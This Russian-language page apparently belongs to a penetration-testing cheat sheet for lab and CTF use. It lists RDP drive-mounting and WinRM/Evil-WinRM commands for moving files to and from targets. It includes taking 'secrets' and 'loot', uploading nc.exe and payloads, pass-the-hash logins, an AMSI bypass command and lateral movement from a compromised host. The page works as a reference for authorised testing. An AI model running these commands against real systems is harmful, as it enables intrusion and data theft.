# 08 - RDP / WinRM

> [← README](../../README_RU.md) · [Следующий раздел →](09-lolbins.md)

Двусторонние интерактивные каналы. **RDP** монтирует твою локальную папку прямо в сессию цели. **WinRM** (PowerShell Remoting) копирует файлы через уже установленную сессию - выручает, когда HTTP/HTTPS/SMB недоступны.

> **Вынесено в другие файлы:** SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md), Netcat - [07-netcat.md](07-netcat.md).

---

## Навигация

|  |  |
|---|---|
| [1. RDP - монтирование диска](#1-rdp---монтирование-диска) | [2. WinRM (PowerShell Remoting)](#2-winrm-powershell-remoting) |
| [3. Evil-WinRM](#3-evil-winrm) | [4. Локальная лаба (VMware)](#4-локальная-лаба-vmware) |
| [5. Диагностика](#5-диагностика) |  |

---

## 1. RDP - монтирование диска

Подключаемся к цели и монтируем свою локальную папку внутрь сессии. Внутри RDP она видна как `\\tsclient\<имя>`.

### xfreerdp

**Смонтировать `/tmp/share` как диск `share`:**
```bash
xfreerdp /v:$RHOST /d:HTB /u:administrator /p:'Password0@' /drive:share,/tmp/share
```

**Игнорировать сертификат и включить буфер обмена:**
```bash
xfreerdp /v:$RHOST /u:administrator /p:'Password0@' /drive:share,/tmp/share /cert:ignore /clipboard
```

**Нестандартный порт:**
```bash
xfreerdp /v:$RHOST:3389 /u:administrator /p:'Password0@' /drive:share,/tmp/share
```

**Динамическое разрешение окна:**
```bash
xfreerdp /v:$RHOST /u:administrator /p:'Password0@' /drive:share,/tmp/share /dynamic-resolution
```

### rdesktop

**Смонтировать `/tmp/share` как диск `share`:**
```bash
rdesktop $RHOST -d HTB -u administrator -p 'Password0@' -r disk:share='/tmp/share'
```

**С буфером обмена:**
```bash
rdesktop $RHOST -u administrator -p 'Password0@' -r disk:share='/tmp/share' -r clipboard:CLIPBOARD
```

### mstsc (Windows-клиент)

**Запустить клиент RDP:**
```cmd
mstsc /v:%RHOST%
```

> У `mstsc.exe` **нет** ключа `/drive` - проброс диска включается в GUI: **Local Resources → More… → Drives**. После подключения свой диск виден как `\\tsclient\C`.

### Внутри RDP-сессии

**Проводник - путь к смонтированному диску:**
```text
\\tsclient\share
```

**Скачать файл к себе (из цели на свой диск):**
```text
copy C:\Users\Public\secrets.zip \\tsclient\share\
```

**Залить файл на цель (со своего диска):**
```text
copy \\tsclient\share\payload.exe C:\Users\Public\
```

### Полезные флаги

| Флаг xfreerdp | Что делает |
|---------------|-----------|
| `/v:host[:port]` | адрес (и порт) цели |
| `/u:user` `/d:domain` `/p:pass` | учётные данные |
| `/drive:<имя>,<путь>` | смонтировать локальную папку |
| `/cert:ignore` | не проверять сертификат |
| `/clipboard` | общий буфер обмена |
| `/dynamic-resolution` | подстраивать разрешение |
| `+clipboard` | включить clipboard (старый синтаксис) |

---

## 2. WinRM (PowerShell Remoting)

**PowerShell Remoting (WinRM)** - удалённое управление Windows-машиной через PowerShell. Порты: **5985** (HTTP), **5986** (HTTPS).

> **Важно:** если порт закрыт - ничего не выйдет. Нужны включённый WinRM (`Enable-PSRemoting`), права и рабочие учётные данные.

### Подготовка цели (если WinRM ещё не включён)

**Включить WinRM (нужны права админа, на цели):**
```powershell
Enable-PSRemoting -Force
```

**Разрешить Basic-аутентификацию (для не-доменных сценариев):**
```powershell
winrm set winrm/config/service/auth '@{Basic="true"}'
```

**Разрешить незашифрованный трафик (только для лаб, HTTP):**
```powershell
winrm set winrm/config/service '@{AllowUnencrypted="true"}'
```

**Для workgroup - добавить цель в TrustedHosts (на машине-источнике):**
```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<target>" -Force
```

### Проверка доступности

**Порт открыт (5985 HTTP / 5986 HTTPS):**
```powershell
Test-NetConnection -ComputerName <target> -Port 5985
```

**WinRM включён локально:**
```powershell
Test-WSMan -ComputerName localhost
```

**Права на подключение к удалённому ПК:**
```powershell
Get-PSSessionConfiguration -ComputerName <target>
```

### Создание сессии

**С текущими учётными данными:**
```powershell
$Session = New-PSSession -ComputerName <target>
```

**С явными учётными данными:**
```powershell
$Cred = Get-Credential
$Session = New-PSSession -ComputerName <target> -Credential $Cred
```

**Через HTTPS и нестандартный порт:**
```powershell
$Session = New-PSSession -ComputerName <target> -Port 5986 -UseSSL
```

**Для workgroup (Basic/Negotiate):**
```powershell
$Session = New-PSSession -ComputerName <target> -Credential $Cred -Authentication Negotiate
```

**Интерактивная сессия (как будто сидим за удалённым ПК):**
```powershell
Enter-PSSession -ComputerName <target>
```

**Выход из интерактивной сессии:**
```powershell
Exit-PSSession
```

### Передача файлов

**Отправить файл на удалённый ПК:**
```powershell
Copy-Item -Path C:\Users\Public\payload.exe -ToSession $Session -Destination C:\Users\Public\payload.exe
```

**Отправить несколько файлов:**
```powershell
Copy-Item -Path C:\Users\Public\*.ps1 -ToSession $Session -Destination C:\Users\Public\
```

**Отправить всю папку:**
```powershell
Copy-Item -Path C:\Users\Public\folder\ -ToSession $Session -Destination C:\Users\Public\ -Recurse
```

**Забрать файл с удалённого ПК:**
```powershell
Copy-Item -Path "C:\Users\Public\secrets.txt" -Destination C:\Users\Public\ -FromSession $Session
```

**Забрать несколько файлов:**
```powershell
Copy-Item -Path "C:\Users\Public\*.txt" -Destination C:\Users\Public\ -FromSession $Session
```

**Забрать папку рекурсивно:**
```powershell
Copy-Item -Path "C:\Users\Public\loot\" -Destination C:\Users\Public\ -FromSession $Session -Recurse
```

### Выполнение команд через сессию

**Одна команда:**
```powershell
Invoke-Command -Session $Session -ScriptBlock { Get-Process }
```

**Скрипт с параметрами:**
```powershell
Invoke-Command -Session $Session -FilePath C:\Users\Public\script.ps1 -ArgumentList "param1", "param2"
```

**С сохранением результата:**
```powershell
$Result = Invoke-Command -Session $Session -ScriptBlock { Get-Service | Where-Object Status -eq 'Running' }
```

### Управление сессиями

**Показать все активные сессии:**
```powershell
Get-PSSession
```

**Показать сессии на удалённом ПК:**
```powershell
Get-PSSession -ComputerName <target>
```

**Закрыть конкретную сессию:**
```powershell
Remove-PSSession -Session $Session
```

**Закрыть все сессии:**
```powershell
Get-PSSession | Remove-PSSession
```

---

## 3. Evil-WinRM

https://github.com/Hackplayers/evil-winrm - в Kali есть по умолчанию. Обёртка над WinRM с удобными `upload`/`download`.

### Установка

**Через gem:**
```bash
gem install evil-winrm
```

**Или из исходников:**
```bash
git clone https://github.com/Hackplayers/evil-winrm && cd evil-winrm && bundle install
```

### Подключение

**Логин/пароль:**
```bash
evil-winrm -i $RHOST -u admin -p "1337"
```

**По NTLM-хэшу (pass-the-hash):**
```bash
evil-winrm -i $RHOST -u admin -H <NThash>
```

**По HTTPS (5986):**
```bash
evil-winrm -i $RHOST -u admin -p "1337" -S
```

**Нестандартный порт:**
```bash
evil-winrm -i $RHOST -u admin -p "1337" -P 5986 -S
```

### Передача файлов

**Залить на цель:**
```text
upload /tmp/share/nc.exe
```

**Скачать С цели на атакующего:**
```text
download secrets.zip
```

**Перейти в каталог и забрать оттуда:**
```text
cd Downloads
download secrets.zip
```

### Полезное внутри

**Список команд:**
```text
menu
```

**Загрузить .NET-сборку в память (Bypass-4MSI и т.п.):**
```text
Bypass-4MSI
```

**Выполнить PowerShell-команду:**
```text
Invoke-Binary /tmp/share/tool.exe
```

---

## 4. Локальная лаба (VMware)

Команды - на самой тестовой Windows-машине (RHOST).

**Сделать сеть приватной:**
```powershell
Set-NetConnectionProfile -InterfaceAlias "Ethernet0" -NetworkCategory Private
```

**Проверить профиль:**
```powershell
Get-NetConnectionProfile
```

**Включить WinRM:**
```powershell
Enable-PSRemoting -Force
```

**Проверить, что всё ок:**
```powershell
Test-NetConnection -Port 5985
```

**Поставить пароль пользователю (если не установлен):**
```cmd
net user admin 1337
```

**После теста - выключить WinRM и вернуть сеть в Public:**
```powershell
Disable-PSRemoting -Force
Set-NetConnectionProfile -InterfaceAlias "Ethernet0" -NetworkCategory Public
```

---

## 5. Диагностика

**RDP-порт открыт:**
```bash
nc -zv $RHOST 3389
```

**WinRM HTTP/HTTPS открыт:**
```bash
nc -zv $RHOST 5985
nc -zv $RHOST 5986
```

**Проверить WinRM из PowerShell:**
```powershell
Test-WSMan -ComputerName <target>
```

**Активные сессии:**
```powershell
Get-PSSession
```

> **Частые грабли:**
>
> - **Workgroup без TrustedHosts** → WinRM отказывает. На источнике: `Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<target>" -Force`.
> - **Порт 5985/5986 закрыт** → ни `New-PSSession`, ни Evil-WinRM не подключатся (проверяем `Test-NetConnection`/`nc`).
> - **Basic-аутентификация** по HTTP требует на цели `auth @{Basic="true"}` и, для лаб, `AllowUnencrypted="true"`.
> - **RDP: у `mstsc.exe` нет `/drive`** - проброс диска только через GUI (Local Resources → Drives).
> - **Путь к проброшенному диску - `\\tsclient\<имя>`**; имя задаём сами в `/drive:<имя>,<путь>`.
> - **RDP нестандартный порт** - у xfreerdp это `/v:host:port`, у mstsc - `/v:host:port`.
> - **`Enable-PSRemoting` требует админа** и включённой сети профиля Private/Domain (на Public он откажется).

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [07 - Netcat](07-netcat.md) · [09 - LOLBins](09-lolbins.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

> **Про `<target>`.** В разделах WinRM/Evil-WinRM речь часто про **lateral movement**: у нас уже есть шелл на одной Windows-машине, и мы идём на вторую. Там `<target>` - это вторая, удалённая машина, а команды выполняются на первой (скомпрометированной).

---

[← Назад к справочнику](../../README_RU.md)
